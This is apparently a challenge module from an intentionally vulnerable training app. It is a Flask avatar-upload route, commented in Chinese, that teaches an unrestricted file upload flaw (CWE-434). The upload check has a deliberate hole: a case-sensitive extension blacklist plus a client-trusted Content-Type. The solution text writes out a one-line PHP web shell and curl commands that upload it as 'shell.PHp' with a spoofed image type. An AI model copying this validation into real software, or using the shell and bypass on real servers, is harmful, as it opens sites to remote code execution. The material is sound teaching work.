"""上传头像处的文件类型绕过。

过滤器用「后缀黑名单 + Content-Type 必须是图片」，两条都只是「看起来管用」：
黑名单是大小写敏感的，Content-Type 是客户端说了算的。
"""

import os
import re

from vuln4all import Vuln, render_template, request, send_from_directory, url_for

#: 黑名单。注意：黑名单永远列不全，而且这里还写成了大小写敏感的比对。
BLOCKED_EXTENSIONS = [".php", ".php5", ".phtml", ".jsp", ".asp", ".aspx", ".py", ".sh"]

SAFE_NAME = re.compile(r"[^0-9A-Za-z._\u4e00-\u9fff-]")


class AvatarUpload(Vuln):
    info = {
        "name": "上传头像处的文件类型绕过",
        "author": ["guaidao2"],
        "cwe": "CWE-434",
        "owasp": "A03:2021 - Injection",
        "description": (
            "上传头像的地方做了两道检查：后缀不能在黑名单里、Content-Type 必须是图片。"
            "两道都经不起推敲 —— 一道大小写敏感，一道完全听客户端的。"
        ),
        "hint": (
            "浏览器上传时，Content-Type 是它自己根据文件后缀猜的，你改不了。"
            "所以这题得用 curl 或 Burp 手工构造请求：一个能同时控制文件名和 "
            "Content-Type 的工具。先想想：黑名单里的 .php，写成 .PHP 会怎样？"
        ),
        "solution": (
            "浏览器做不了这题，得用命令行。先随便创建一个恶意文件：\n\n"
            "  printf '<?php system($_GET[0]); ?>' > shell.php\n\n"
            "然后分两步试：\n\n"
            "  ① 只改大小写（被 Content-Type 拦下）：\n"
            "  curl -s -o /dev/null -w '%{http_code}\\n' \\\n"
            "    -F 'avatar=@shell.php;filename=shell.PHp' \\\n"
            "    '<主入口>/upload'\n\n"
            "  ② 再把 Content-Type 也改了（绕过成功）：\n"
            "  curl -s -X POST \\\n"
            "    -F 'avatar=@shell.php;filename=shell.PHp;type=image/png' \\\n"
            "    '<主入口>/upload'\n\n"
            "原理：\n"
            "  · name.endswith('.php') 是大小写敏感的，'shell.PHp' 不匹配。\n"
            "  · Content-Type 是客户端在请求里自己写的，服务端凭什么信它？\n"
            "两个都绕过去，文件就落到了上传目录里。"
        ),
        "refs": [
            "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
            "https://portswigger.net/web-security/file-upload",
        ],
    }

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        upload_dir = ctx.workspace / "uploads"
        upload_dir.mkdir(parents=True, exist_ok=True)

        def list_uploads():
            return sorted(
                (p.name for p in upload_dir.iterdir() if p.is_file()),
                key=str.lower,
            )

        @app.route("/")
        def index():
            return render_template(
                "upload.html",
                files=list_uploads(),
                error=None,
                bypassed=None,
                blocked_list=BLOCKED_EXTENSIONS,
            )

        @app.route("/upload", methods=["POST"])
        def upload():
            uploaded = request.files.get("avatar")
            if uploaded is None or not uploaded.filename:
                return render_template(
                    "upload.html",
                    files=list_uploads(),
                    error="没选文件",
                    bypassed=None,
                    blocked_list=BLOCKED_EXTENSIONS,
                )

            # 顺手做个 basename —— 不然这里就变成第二个洞了（路径穿越）。
            # 路径穿越是另一道题，不在这题的教学范围里。
            filename = os.path.basename(uploaded.filename.replace("\\", "/"))
            filename = SAFE_NAME.sub("_", filename) or "avatar"

            # ↓↓↓ 洞在这里 ↓↓↓
            # 第一层：后缀黑名单 —— 大小写敏感，写成 .PHp 就绕过去了
            blocked_by_ext = any(filename.endswith(ext) for ext in BLOCKED_EXTENSIONS)
            # 第二层：Content-Type 检查 —— 这个头是客户端自己写的，凭什么信它
            blocked_by_type = not (uploaded.mimetype or "").startswith("image/")
            # ↑↑↑ 正确的做法见 writeup：白名单 + 重新生成文件名 + 上传目录不可执行 ↑↑↑

            if blocked_by_ext or blocked_by_type:
                reasons = []
                if blocked_by_ext:
                    reasons.append("后缀 %s 在黑名单里" % os.path.splitext(filename)[1])
                if blocked_by_type:
                    reasons.append("Content-Type 是 %r，不是图片" % (uploaded.mimetype or ""))
                return render_template(
                    "upload.html",
                    files=list_uploads(),
                    error="被拦下了：" + "；".join(reasons),
                    bypassed=None,
                    blocked_list=BLOCKED_EXTENSIONS,
                    rejected_name=filename,
                    rejected_type=uploaded.mimetype or "",
                ), 400

            target = upload_dir / filename
            uploaded.save(str(target))

            # 判定：落地的文件后缀（小写后）在黑名单里 —— 说明黑名单被绕过了
            landed_ext = os.path.splitext(filename)[1].lower()
            bypassed = landed_ext in BLOCKED_EXTENSIONS

            return render_template(
                "upload.html",
                files=list_uploads(),
                error=None,
                bypassed=(filename, landed_ext, uploaded.mimetype or "") if bypassed else None,
                blocked_list=BLOCKED_EXTENSIONS,
            )

        @app.route("/uploads/<path:filename>")
        def serve_upload(filename):
            # send_from_directory 自己会拦路径穿越
            return send_from_directory(str(upload_dir), filename)

        @app.route("/delete", methods=["POST"])
        def delete():
            target = os.path.basename(request.form.get("name", ""))
            victim = upload_dir / target
            if target and victim.is_file():
                victim.unlink()
            return render_template(
                "upload.html",
                files=list_uploads(),
                error=None,
                bypassed=None,
                blocked_list=BLOCKED_EXTENSIONS,
                deleted=target,
            )

        return {"": app}
